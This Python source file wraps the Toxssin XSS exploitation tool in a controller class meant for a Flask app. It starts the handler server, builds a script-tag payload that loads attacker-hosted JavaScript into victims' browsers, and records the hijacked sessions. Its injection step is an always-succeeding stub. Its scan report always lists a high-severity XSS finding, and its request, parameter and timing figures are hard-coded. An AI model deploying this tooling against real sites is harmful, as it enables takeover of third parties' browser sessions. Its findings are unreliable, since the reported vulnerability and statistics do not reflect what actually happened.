import subprocess
import re
import logging
import time
import json
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ToxssinController:
    def __init__(self):
        self.cert_path = Path("cert.pem")
        self.key_path = Path("key.pem")
        self.process = None
        self.sessions = []
        self.executor = ThreadPoolExecutor(max_workers=1)
        self.last_output = ""

    def validate_certificates(self) -> bool:
        """Verify certificates exist and are valid"""
        if not self.cert_path.exists() or not self.key_path.exists():
            logger.error("Certificate or key file not found")
            return False
        return True

    def start_toxssin(self, target_url: str, port: int = 443) -> bool:
        """Start Toxssin subprocess"""
        if not self.validate_certificates():
            return False

        cmd = [
            "python", "toxssin.py",
            "-u", target_url,
            "-c", str(self.cert_path),
            "-k", str(self.key_path),
            "-p", str(port)
        ]

        try:
            self.process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            time.sleep(3)  # Allow server initialization
            return True
        except Exception as e:
            logger.error(f"Failed to start Toxssin: {e}")
            return False

    def inject_payload(self, vulnerable_url: str, payload: str) -> bool:
        """Inject payload into vulnerable endpoint"""
        # Implementation depends on your injection method
        # This is a placeholder for actual injection logic
        try:
            logger.info(f"Injecting payload into {vulnerable_url}")
            # Your actual injection mechanism here
            return True
        except Exception as e:
            logger.error(f"Injection failed: {e}")
            return False

    def monitor_output(self) -> None:
        """Monitor Toxssin output for new sessions"""
        while self.process and self.process.poll() is None:
            line = self.process.stdout.readline()
            if line:
                self.last_output = line.strip()
                self._parse_session(line)

    def _parse_session(self, output_line: str) -> None:
        """Parse Toxssin output for session data"""
        session_pattern = r"\[New Session\] (.+) - (.+)"
        match = re.search(session_pattern, output_line)
        if match:
            session_id, origin = match.groups()
            self.sessions.append({
                "id": session_id,
                "origin": origin,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "active": True
            })
            logger.info(f"New session detected: {session_id}")

    def run_scan(self, target_url: str, custom_payload: Optional[str] = None) -> Dict:
        """Execute complete XSS test workflow"""
        response = {
            "status": "failed",
            "tested_url": target_url,
            "handler_url": None,
            "session_active": False,
            "error": None,
            "findings": {
                "vulnerabilities": [],
                "scan_stats": {
                    "requests": 0,
                    "tested_params": 0,
                    "success_rate": 0.0,
                    "time": "00:00:00"
                }
            }
        }

        try:
            # Start Toxssin server
            if not self.start_toxssin(target_url):
                response["error"] = "Failed to start Toxssin server"
                return response

            # Get handler URL from output
            handler_url = self._get_handler_url()
            if not handler_url:
                response["error"] = "Failed to get handler URL"
                return response

            response["handler_url"] = handler_url

            # Use custom payload if provided
            injection_payload = custom_payload or f'<script src="{handler_url}"></script>'
            
            # Inject payload (implementation specific)
            if not self.inject_payload(target_url, injection_payload):
                response["error"] = "Payload injection failed"
                return response

            # Monitor for sessions
            self.executor.submit(self.monitor_output)
            time.sleep(10)  # Wait for potential sessions

            # Prepare success response
            response.update({
                "status": "completed",
                "session_active": len(self.sessions) > 0,
                "findings": {
                    "vulnerabilities": [{
                        "type": "XSS",
                        "url": target_url,
                        "handler_url": handler_url,
                        "severity": "high",
                        "payload_used": injection_payload
                    }],
                    "scan_stats": {
                        "requests": 1,
                        "tested_params": 1,
                        "success_rate": 1.0 if self.sessions else 0.0,
                        "time": "00:00:10"
                    }
                }
            })

        except Exception as e:
            response["error"] = str(e)
            logger.error(f"Scan failed: {e}")

        finally:
            if self.process:
                self.process.terminate()

        return response

    def _get_handler_url(self) -> Optional[str]:
        """Extract handler URL from Toxssin output"""
        for _ in range(10):  # Check output for 10 seconds max
            line = self.process.stdout.readline()
            if "JavaScript poison handler URL" in line:
                return line.split(": ")[1].strip()
            time.sleep(1)
        return None

    def get_active_sessions(self) -> List[Dict]:
        """Return list of active sessions"""
        return [s for s in self.sessions if s["active"]]

    def stop(self) -> None:
        """Cleanup resources"""
        if self.process:
            self.process.terminate()
        self.executor.shutdown()

# Singleton instance for Flask integration
toxssin_controller = ToxssinController()
